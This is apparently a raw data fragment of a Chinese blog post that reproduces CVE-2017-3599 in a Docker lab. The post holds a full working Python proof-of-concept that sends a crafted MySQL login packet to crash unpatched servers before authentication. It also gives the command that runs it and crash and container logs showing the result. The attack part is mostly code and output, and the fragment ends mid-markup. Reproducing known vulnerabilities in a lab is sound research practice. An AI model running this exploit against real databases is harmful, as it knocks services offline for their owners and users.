7f3ca45a1e98 thread_stack 0x40000\nmysqld(my_print_stacktrace+0x2c)[0x8c3d5c]\nmysqld(handle_fatal_signal+0x481)[0x661df1]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]\n/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]\nmysqld[0x672dc4]\nmysqld[0x683e2d]\nmysqld[0x68433e]\nmysqld[0x6730a9]\nmysqld[0x6724df]\nmysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]\nmysqld[0x6abe17]\nmysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]\nmysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]\nmysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]\nmysqld(handle_one_connection+0x40)[0x6ad570]\nmysqld(pfs_spawn_thread+0x146)[0x8fa106]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]\n\nTrying to get some variables.\nSome pointers may be invalid and cause the dump to abort.\nQuery (0): Connection ID (thread ID): 1\nStatus: NOT_KILLED\n\nThe manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains\ninformation that should help you find out what is causing the crash.\n```","slug":"CVE-2017-3599漏洞复现","published":1,"updated":"2024-01-14T15:41:32.267Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvvit0007foi83fv6cryw","content":"<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.exploit-db.com/exploits/41954\">MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit</a></p>\n<h2 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h2><blockquote>\n<p>Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql&#x2F;auth&#x2F;sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.</p>\n</blockquote>\n<h2 id=\"被测环境\"><a href=\"#被测环境\" class=\"headerlink\" title=\"被测环境\"></a>被测环境</h2><ul>\n<li>docker镜像：<code>mysql:5.6.35</code></li>\n<li>启动被测环境容器：<code>docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35</code></li>\n</ul>\n<h2 id=\"POC脚本\"><a href=\"#POC脚本\" class=\"headerlink\" title=\"POC脚本\"></a>POC脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python2.7</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"># Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py</span></span><br><span class=\"line\"><span class=\"string\"># Exploit Title: Remote MySQL DOS (Integer Overflow)</span></span><br><span class=\"line\"><span class=\"string\"># Google Dork: N/A</span></span><br><span class=\"line\"><span class=\"string\"># Date: 13th April 2017</span></span><br><span class=\"line\"><span class=\"string\"># Exploit Author: Rodrigo Marcos</span></span><br><span class=\"line\"><span class=\"string\"># Vendor Homepage: https://www.mysql.com/</span></span><br><span class=\"line\"><span class=\"string\"># Software Link: https://www.mysql.com/downloads/</span></span><br><span class=\"line\"><span class=\"string\"># Version: 5.6.35 and below / 5.7.17 and below</span></span><br><span class=\"line\"><span class=\"string\"># Tested on: N/A</span></span><br><span class=\"line\"><span class=\"string\"># CVE : CVE-2017-3599</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> socket </span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">CVE-2017-3599 Proof of Concept exploit code.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Rodrigo Marcos</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv)&lt;<span class=\"number\">2</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Usage: python &quot;</span> + sys.argv[<span class=\"number\">0</span>] + <span class=\"string\">&quot; host [port]&quot;</span></span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    HOST = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv)&gt;<span class=\"number\">2</span>:</span><br><span class=\"line\">        PORT = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>]) <span class=\"comment\"># Yes, no error checking... living on the wild side!</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        PORT = <span class=\"number\">3306</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Creating packet...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">3 bytes\t\tPacket lenth</span></span><br><span class=\"line\"><span class=\"string\">1 bytes \tPacket number</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Login request:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Packet format (when the server is 4.1 or newer):</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Bytes       Content</span></span><br><span class=\"line\"><span class=\"string\">-----       ----</span></span><br><span class=\"line\"><span class=\"string\">4           client capabilities</span></span><br><span class=\"line\"><span class=\"string\">4           max packet size</span></span><br><span class=\"line\"><span class=\"string\">1           charset number</span></span><br><span class=\"line\"><span class=\"string\">23          reserved (always 0)</span></span><br><span class=\"line\"><span class=\"string\">n           user name, \\0-terminated</span></span><br><span class=\"line\"><span class=\"string\">n           plugin auth data (e.g. scramble), length encoded</span></span><br><span class=\"line\"><span class=\"string\">n           database name, \\0-terminated</span></span><br><span class=\"line\"><span class=\"string\">            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)</span></span><br><span class=\"line\"><span class=\"string\">n           client auth plugin name - \\0-terminated string,</span></span><br><span class=\"line\"><span class=\"string\">            (if CLIENT_PLUGIN_AUTH is set in the capabilities)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># packet_len = &#x27;\\x64\\x00\\x00&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet_num = <span class=\"string\">&#x27;\\x01&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Login request packet</span></span><br><span class=\"line\">packet_cap = <span class=\"string\">&#x27;\\x85\\xa2\\xbf\\x01&#x27;</span>\t\t<span class=\"comment\"># client capabilities (default)</span></span><br><span class=\"line\">packet_max = <span class=\"string\">&#x27;\\x00\\x00\\x00\\x01&#x27;</span>\t\t<span class=\"comment\"># max packet size (default)</span></span><br><span class=\"line\">packet_cset = <span class=\"string\">&#x27;\\x21&#x27;</span>\t\t\t\t<span class=\"comment\"># charset (default)</span></span><br><span class=\"line\">p_reserved = <span class=\"string\">&#x27;\\x00&#x27;</span> * <span class=\"number\">23</span> \t\t\t<span class=\"comment\"># 23 bytes reserved with nulls (default)</span></span><br><span class=\"line\">packet_usr =  <span class=\"string\">&#x27;test\\x00&#x27;</span> \t\t\t<span class=\"comment\"># username null terminated (default)</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet_auth  = <span class=\"string\">&#x27;\\xff&#x27;</span>\t\t\t<span class=\"comment\"># both \\xff and \\xfe crash the server</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">Conditions to crash:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">1 - packet_auth must start with \\xff or \\xfe</span></span><br><span class=\"line\"><span class=\"string\">2 - packet_auth must be shorter than 8 chars</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">The expected value is the password, which could be of two different formats</span></span><br><span class=\"line\"><span class=\"string\">(null terminated or length encoded) depending on the client functionality.</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth </span><br><span class=\"line\">packet_len = pack(<span class=\"string\">&#x27;i&#x27;</span>,<span class=\"built_in\">len</span>(packet))[:<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">request = packet_len + packet_num + packet</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Connecting to host...&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((HOST, PORT))</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Connected.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Unable to connect to host &quot;</span> + HOST + <span class=\"string\">&quot; on port &quot;</span> + <span class=\"built_in\">str</span>(PORT) + <span class=\"string\">&quot;.&quot;</span>\t</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Exiting.&quot;</span></span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Receiving greeting from remote host...&quot;</span></span><br><span class=\"line\">data = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Done.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Sending our payload...&quot;</span></span><br><span class=\"line\">s.send(request)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Done.&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#print &quot;Our data: %r&quot; % request</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.close()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击执行\"><a href=\"#攻击执行\" class=\"headerlink\" title=\"攻击执行\"></a>攻击执行</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python poc.py IP 3306</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击效果\"><a href=\"#攻击效果\" class=\"headerlink\" title=\"攻击效果\"></a>攻击效果</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">拒绝服务，查看数据库的容器日志：</span><br><span class=\"line\"></span><br><span class=\"line\">root@yml-penetration:~/Workspace/cve-2017-3599<span class=\"comment\"># docker logs 100</span></span><br><span class=\"line\">Initializing database</span><br><span class=\"line\">2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class=\"line\">2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: <span class=\"built_in\">wait</span>...</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class=\"built_in\">log</span> file ./ib_logfile101 size to 48 MB</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class=\"built_in\">log</span> file ./ib_logfile1 size to 48 MB</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Renaming <span class=\"built_in\">log</span> file ./ib_logfile101 to ./ib_logfile0</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Warning] InnoDB: New <span class=\"built_in\">log</span> files created, LSN=45781</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 0</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625977</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class=\"line\">2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625977</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625987</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !</span><br><span class=\"line\">To <span class=\"keyword\">do</span> so, start the server, <span class=\"keyword\">then</span> issue the following commands:</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mysqladmin -u root password <span class=\"string\">&#x27;new-password&#x27;</span></span><br><span class=\"line\">/usr/bin/mysqladmin -u root -h 100bfe039d09 password <span class=\"string\">&#x27;new-password&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Alternatively you can run:</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mysql_secure_installation</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">which</span> will also give you the option of removing the <span class=\"built_in\">test</span></span><br><span class=\"line\">databases and anonymous user created by default.  This is</span><br><span class=\"line\">strongly recommended <span class=\"keyword\">for</span> production servers.</span><br><span class=\"line\"></span><br><span class=\"line\">See the manual <span 